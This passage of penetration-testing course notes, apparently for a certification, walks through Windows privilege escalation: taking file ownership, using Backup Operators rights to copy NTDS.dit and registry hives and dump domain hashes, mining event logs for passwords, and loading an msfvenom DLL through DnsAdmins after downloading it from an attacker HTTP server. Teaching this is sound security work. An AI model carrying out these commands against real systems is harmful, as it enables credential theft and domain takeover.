takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'\n \nSUCCESS: The file (or folder): \"C:\\Department Shares\\Private\\IT\\cred.txt\" now owned by user \"WINLPE-SRV01\\htb-student\".\n```\n\n#### Confirming Ownership Changed\n\nWe can confirm ownership using the same command as before. We now see that our user account is the file owner.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> Get-ChildItem -Path 'C:\\Department Shares\\Private\\IT\\cred.txt' | select name,directory, @{Name=\"Owner\";Expression={(Get-ACL $_.Fullname).Owner}}\n \nName     Directory                       Owner\n----     ---------                       -----\ncred.txt C:\\Department Shares\\Private\\IT WINLPE-SRV01\\htb-student\n```\n\n#### Modifying the File ACL\n\nWe may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\ncat : Access to the path 'C:\\Department Shares\\Private\\IT\\cred.txt' is denied.\nAt line:1 char:1\n+ cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\Department Shares\\Private\\IT\\cred.txt:String) [Get-Content], Unaut\n   horizedAccessException\n    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand\n```\n\nLet's grant our user full privileges over the target file.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F\n\nprocessed file: C:\\Department Shares\\Private\\IT\\cred.txt\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\n#### Reading the File\n\nIf all went to plan, we can now read the target file from the command line, open it if we have RDP access, or copy it down to our attack system for additional processing (such as cracking the password for a KeePass database.\n\nSeTakeOwnershipPrivilege\n\n```powershell-session\nPS C:\\htb> cat 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\nNIX01 admin\n \nroot:n1X_p0wer_us3er!\n```\n\nAfter performing these changes, we would want to make every effort to revert the permissions/file ownership. If we cannot for some reason, we should alert our client and carefully document the modifications in an appendix of our report deliverable. Again, leveraging this permission can be considered a destructive action and should be done with great care. Some clients may prefer that we document the ability to perform the action as evidence of a misconfiguration but not fully take advantage of the flaw due to the potential impact.\n\n---\n\n## When to Use?\n\n#### Files of Interest\n\nSome local files of interest may include:\n\nSeTakeOwnershipPrivilege\n\n```shell-session\nc:\\inetpub\\wwwwroot\\web.config\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n```\n\nWe may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/11-Windows Built-in Groups",
    "path": "02_CPTS/17-Windows Privilege Escalation/11-Windows Built-in Groups.md",
    "title": "11 Windows Built In Groups",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- As mentioned in the Windows Privileges Overview section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get add...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nAs mentioned in the `Windows Privileges Overview` section, Windows servers, and especially Domain Controllers, have a variety of built-in groups that either ship with the operating system or get added when the Active Directory Domain Services role is installed on a system to promote a server to a Domain Controller. Many of these groups confer special privileges on their members, and some can be leveraged to escalate privileges on a server or a Domain Controller. [Here](https://ss64.com/nt/syntax-security_groups.html) is a listing of all built-in Windows groups along with a detailed description of each. This [page](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory) has a detailed listing of privileged accounts and groups in Active Directory. It is essential to understand the implications of membership in each of these groups whether we gain access to an account that is a member of one of them or notice excessive/unnecessary membership in one or more of these groups during an assessment. For our purposes, we will focus on the following built-in groups. Each of these groups exists on systems from Server 2008 R2 to the present, except for Hyper-V Administrators (introduced with Server 2012).\n\nAccounts may be assigned to these groups to enforce least privilege and avoid creating more Domain Admins and Enterprise Admins to perform specific tasks, such as backups. Sometimes vendor applications will also require certain privileges, which can be granted by assigning a service account to one of these groups. Accounts may also be added by accident or leftover after testing a specific tool or script. We should always check these groups and include a list of each group's members as an appendix in our report for the client to review and determine if access is still necessary.\n\n||||\n|---|---|---|\n|[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)|[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)|[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)|\n|[Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)|[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)|[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)|\n\n---\n\n## Backup Operators\n\nAfter landing on a machine, we can use the command `whoami /groups` to show our current group memberships. Let's examine the case where we are a member of the `Backup Operators` group. Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.\n\nWe can use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.\n\n#### Importing Libraries\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Import-Module .\\SeBackupPrivilegeUtils.dll\nPS C:\\htb> Import-Module .\\SeBackupPrivilegeCmdLets.dll\n```\n\n#### Verifying SeBackupPrivilege is Enabled\n\nLet's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.\n\nNote: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeMachineAccountPrivilege     Add workstations to domain     Disabled\nSeBackupPrivilege             Back up files and directories  Disabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Get-SeBackupPrivilege\n\nSeBackupPrivilege is disabled\n```\n\n#### Enabling SeBackupPrivilege\n\nIf the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Set-SeBackupPrivilege\nPS C:\\htb> Get-SeBackupPrivilege\n\nSeBackupPrivilege is enabled\n```\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== ========\nSeMachineAccountPrivilege     Add workstations to domain     Disabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Disabled\nSeShutdownPrivilege           Shut down the system           Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Disabled\n```\n\n#### Copying a Protected File\n\nAs we can see above, the privilege was enabled successfully. This privilege can now be leveraged to copy any protected file.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> dir C:\\Confidential\\\n\n    Directory: C:\\Confidential\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----         5/6/2021   1:01 PM             88 2021 Contract.txt\n\n\nPS C:\\htb> cat 'C:\\Confidential\\2021 Contract.txt'\n\ncat : Access to the path 'C:\\Confidential\\2021 Contract.txt' is denied.\nAt line:1 char:1\n+ cat 'C:\\Confidential\\2021 Contract.txt'\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (C:\\Confidential\\2021 Contract.txt:String) [Get-Content], Unauthor\n   izedAccessException\n    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand\n```\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt\n\nCopied 88 bytes\n\n\nPS C:\\htb>  cat .\\Contract.txt\n\nInlanefreight 2021 Contract\n\n==============================\n\nBoard of Directors:\n\n<...SNIP...>\n```\n\nThe commands above demonstrate how sensitive information was accessed without possessing the required permissions.\n\n#### Attacking a Domain Controller - Copying NTDS.dit\n\nThis group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users.\n\nAs the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> diskshadow.exe\n\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC,  10/14/2020 12:57:52 AM\n\nDISKSHADOW> set verbose on\nDISKSHADOW> set metadata C:\\Windows\\Temp\\meta.cab\nDISKSHADOW> set context clientaccessible\nDISKSHADOW> set context persistent\nDISKSHADOW> begin backup\nDISKSHADOW> add volume C: alias cdrive\nDISKSHADOW> create\nDISKSHADOW> expose %cdrive% E:\nDISKSHADOW> end backup\nDISKSHADOW> exit\n\nPS C:\\htb> dir E:\n\n\n    Directory: E:\\\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         5/6/2021   1:00 PM                Confidential\nd-----        9/15/2018  12:19 AM                PerfLogs\nd-r---        3/24/2021   6:20 PM                Program Files\nd-----        9/15/2018   2:06 AM                Program Files (x86)\nd-----         5/6/2021   1:05 PM                Tools\nd-r---         5/6/2021  12:51 PM                Users\nd-----        3/24/2021   6:38 PM                Windows\n```\n\n#### Copying NTDS.dit Locally\n\nNext, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\n\nCopied 16777216 bytes\n```\n\n#### Backing up SAM and SYSTEM Registry Hives\n\nThe privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`\n\nWindows Built-in Groups\n\n```cmd-session\nC:\\htb> reg save HKLM\\SYSTEM SYSTEM.SAV\n\nThe operation completed successfully.\n\n\nC:\\htb> reg save HKLM\\SAM SAM.SAV\n\nThe operation completed successfully.\n```\n\nIt's worth noting that if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.\n\n#### Extracting Credentials from NTDS.dit\n\nWith the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.\n\nWindows Built-in Groups\n\n```powershell-session\nPS C:\\htb> Import-Module .\\DSInternals.psd1\nPS C:\\htb> $key = Get-BootKey -SystemHivePath .\\SYSTEM\nPS C:\\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key\n\nDistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\nSid: S-1-5-21-669053619-2741956077-1013132368-500\nGuid: f28ab72b-9b16-4b52-9f63-ef4ea96de215\nSamAccountName: Administrator\nSamAccountType: User\nUserPrincipalName:\nPrimaryGroupId: 513\nSidHistory:\nEnabled: True\nUserAccountControl: NormalAccount, PasswordNeverExpires\nAdminCount: True\nDeleted: False\nLastLogonDate: 5/6/2021 5:40:30 PM\nDisplayName:\nGivenName:\nSurname:\nDescription: Built-in account for administering the computer/domain\nServicePrincipalName:\nSecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,\nDiscretionaryAclProtected, SelfRelative\nOwner: S-1-5-21-669053619-2741956077-1013132368-512\nSecrets\n  NTHash: cf3a5525ee9414229e66279623ed5c58\n  LMHash:\n  NTHashHistory:\n  LMHashHistory:\n  SupplementalCredentials:\n    ClearText:\n    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7\n    Kerberos:\n      Credentials:\n        DES_CBC_MD5\n          Key: d60dfbbf20548938\n      OldCredentials:\n      Salt: WIN-NB4NGP3TKNKAdministrator\n      Flags: 0\n    KerberosNew:\n      Credentials:\n        AES256_CTS_HMAC_SHA1_96\n          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43\n          Iterations: 4096\n        AES128_CTS_HMAC_SHA1_96\n          Key: 94c300d0e47775b407f2496a5cca1a0a\n          Iterations: 4096\n        DES_CBC_MD5\n          Key: d60dfbbf20548938\n          Iterations: 4096\n      OldCredentials:\n      OlderCredentials:\n      ServiceCredentials:\n      Salt: WIN-NB4NGP3TKNKAdministrator\n      DefaultIterationCount: 4096\n      Flags: 0\n    WDigest:\nKey Credentials:\nCredential Roaming\n  Created:\n  Modified:\n  Credentials:\n```\n\n#### Extracting Hashes Using SecretsDump\n\nWe can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).\n\nWindows Built-in Groups\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL\n\nImpacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation\n\n[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Searching for pekList, be patient\n[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330\n[*] Reading and decrypting hashes from ntds.dit \nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::\nhtb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::\nsvc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nbob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nhyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\nprintsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::\n\n<SNIP>\n```\n\n---\n\n## Robocopy\n\n#### Copying Files with Robocopy\n\nThe built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.\n\nWindows Built-in Groups\n\n```cmd-session\nC:\\htb> robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit\n\n-------------------------------------------------------------------------------\n   ROBOCOPY     ::     Robust File Copy for Windows\n-------------------------------------------------------------------------------\n\n  Started : Thursday, May 6, 2021 1:11:47 PM\n   Source : E:\\Windows\\NTDS\\\n     Dest : C:\\Tools\\ntds\\\n\n    Files : ntds.dit\n\n  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30\n\n------------------------------------------------------------------------------\n\n          New Dir          1    E:\\Windows\\NTDS\\\n100%        New File              16.0 m        ntds.dit\n\n------------------------------------------------------------------------------\n\n               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Dirs :         1         1         0         0         0         0\n   Files :         1         1         0         0         0         0\n   Bytes :   16.00 m   16.00 m         0         0         0         0\n   Times :   0:00:00   0:00:00                       0:00:00   0:00:00\n\n\n   Speed :           356962042 Bytes/sec.\n   Speed :           20425.531 MegaBytes/min.\n   Ended : Thursday, May 6, 2021 1:11:47 PM\n```\n\nThis eliminates the need for any external tools.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/12-Event Log Readers",
    "path": "02_CPTS/17-Windows Privilege Escalation/12-Event Log Readers.md",
    "title": "12 Event Log Readers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Event Log Readers --- Suppose auditing of process creation events and corresponding command line values is enabled. In that case, this information is saved to the Windows security event log as event I...",
    "category": "02_CPTS",
    "content": "# Event Log Readers\n\n---\n\nSuppose [auditing of process creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) events and corresponding command line values is enabled. In that case, this information is saved to the Windows security event log as event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688). Organizations may enable logging of process command lines to help defenders monitor and identify possibly malicious behavior and identify binaries that should not be present on a system. This data can be shipped to a SIEM tool or ingested into a search tool, such as ElasticSearch, to give defenders visibility into what binaries are being run on systems in the network. The tools would then flag any potentially malicious activity, such as the `whoami`, `netstat`, and `tasklist` commands being run from a marketing executive's workstation.\n\nThis [study](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html) shows some of the most run commands by attackers after initial access (`tasklist`, `ver`, `ipconfig`, `systeminfo`, etc.), for reconnaissance (`dir`, `net view`, `ping`, `net use`, `type`, etc.), and for spreading malware within a network (`at`, `reg`, `wmic`, `wusa`, etc.). Aside from monitoring for these commands being run, an organization could take things a step further and restrict the execution of specific commands using fine-tuned AppLocker rules. For an organization with a tight security budget, leveraging these built-in tools from Microsoft can offer excellent visibility into network activities at the host level. Most modern enterprise EDR tools perform detection/blocking but can be out of reach for many organizations due to budgetary and personnel constraints. This small example shows that security improvements, such as network and host-level visibility, can be done with minimal effort, cost, and massive impact.\n\nI performed a penetration test against a medium-sized organization a few years ago with a small security team, no enterprise EDR, but was using a similar configuration to what was detailed above (auditing process creation and command-line values). They caught and contained one of my team members when they ran the `tasklist` command from a member of the finance department's workstation (after capturing credentials using `Responder` and cracking them offline).\n\nAdministrators or members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\\(v=ws.11\\)?redirectedfrom=MSDN#event-log-readers) group have permission to access this log. It is conceivable that system administrators might want to add power users or developers into this group to perform certain tasks without having to grant them administrative access.\n\n#### Confirming Group Membership\n\nEvent Log Readers\n\n```cmd-session\nC:\\htb> net localgroup \"Event Log Readers\"\n\nAlias name     Event Log Readers\nComment        Members of this group can read event logs from local machine\n\nMembers\n\n-------------------------------------------------------------------------------\nlogger\nThe command completed successfully.\n```\n\nMicrosoft has published a reference [guide](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) for all built-in Windows commands, including syntax, parameters, and examples. Many Windows commands support passing a password as a parameter, and if auditing of process command lines is enabled, this sensitive information will be captured.\n\nWe can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.\n\n#### Searching Security Logs Using wevtutil\n\nEvent Log Readers\n\n```powershell-session\nPS C:\\htb> wevtutil qe Security /rd:true /f:text | Select-String \"/user\"\n\n        Process Command Line:   net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword\n```\n\nWe can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`.\n\n#### Passing Credentials to wevtutil\n\nEvent Log Readers\n\n```cmd-session\nC:\\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\"\n```\n\nFor `Get-WinEvent`, the syntax is as follows. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.\n\nNote: Searching the `Security` event log with `Get-WInEvent` requires administrator access or permissions adjusted on the registry key `HKLM\\System\\CurrentControlSet\\Services\\Eventlog\\Security`. Membership in just the `Event Log Readers` group is not sufficient.\n\n#### Searching Security Logs Using Get-WinEvent\n\nEvent Log Readers\n\n```powershell-session\nPS C:\\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}\n\nCommandLine\n-----------\nnet use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword\n```\n\nThe cmdlet can also be run as another user with the `-Credential` parameter.\n\nOther logs include [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/17-Windows Privilege Escalation/13-DnsAdmins",
    "path": "02_CPTS/17-Windows Privilege Escalation/13-DnsAdmins.md",
    "title": "13 DnsAdmins",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DnsAdmins --- Members of the DnsAdmins group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries tha...",
    "category": "02_CPTS",
    "content": "# DnsAdmins\n\n---\n\nMembers of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. The DNS service runs as `NT AUTHORITY\\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain. It is possible to use the built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility to specify the path of the plugin DLL. As detailed in this excellent [post](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):\n\n- DNS management is performed over RPC\n- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line\n- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\DNS\\Parameters\\ServerLevelPluginDll` registry key is populated\n- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)\n- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.\n\nLet's step through the attack.\n\n---\n\n## Leveraging DnsAdmins Access\n\n#### Generating Malicious DLL\n\nWe can generate a malicious DLL to add a user to the `domain admins` group using `msfvenom`.\n\nDnsAdmins\n\n```shell-session\ndrxh3kr@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 313 bytes\nFinal size of dll file: 5120 bytes\nSaved as: adduser.dll\n```\n\n#### Starting Local HTTP Server\n\nNext, start a Python HTTP server.\n\nDnsAdmins\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -m http.server 7777\n\nServing HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...\n10.129.43.9 - - [19/May/2021 19:22:46] \"GET /adduser.dll HTTP/1.1\" 200 -\n```\n\n#### Downloading File to Target\n\nDownload the file to the target.\n\nDnsAdmins\n\n```powershell-session\nPS C:\\htb>  wget \"http://10.10.14.3:7777/adduser.dll\" -outfile \"adduser.dll\"\n```\n\nLet's first see what happens if we use the `dnscmd` utility to load a custom DLL with a non-privileged user.\n\n#### Loading DLL as Non-Privileged User\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n\nDNS Server failed to reset registry property.\n    Status = 5 (0x00000005)\nCommand failed: ERROR_ACCESS_DENIED\n```\n\nAs expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.\n\n#### Loading DLL as Member of DnsAdmins\n\nDnsAdmins\n\n```powershell-session\nC:\\htb> Get-ADGroupMember -Identity DnsAdmins\n\ndistinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\nname              : netadm\nobjectClass       : user\nobjectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14\nSamAccountName    : netadm\nSID               : S-1-5-21-669053619-2741956077-1013132368-1109           \n```\n\n#### Loading Custom DLL\n\nAfter confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n\nRegistry property serverlevelplugindll successfully reset.\nCommand completed successfully.\n```\n\nNote: We must specify the full path to our custom DLL or the attack will not work properly.\n\nOnly the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.\n\nWith the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.\n\nAfter restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.\n\n#### Finding User's SID\n\nFirst, we need our user's SID.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> wmic useraccount where name=\"netadm\" get sid\n\nSID\nS-1-5-21-669053619-2741956077-1013132368-1109\n```\n\n#### Checking Permissions on DNS Service\n\nOnce we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> sc.exe sdshow DNS\n\nD:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)\n```\n\nCheck out the `Windows Fundamentals` module for an explanation of SDDL syntax in Windows.\n\n#### Stopping the DNS Service\n\nAfter confirming these permissions, we can issue the following commands to stop and start the service.\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> sc stop dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 3  STOP_PENDING\n                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x1\n        WAIT_HINT          : 0x7530\n```\n\nThe DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).\n\n#### Starting the DNS Service\n\nDnsAdmins\n\n```cmd-session\nC:\\htb> sc start dns\n\nSERVICE_NAME: dns\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 2  START_PENDING\n                                (NOT_STOPPABLE, NOT_PAUSABLE, 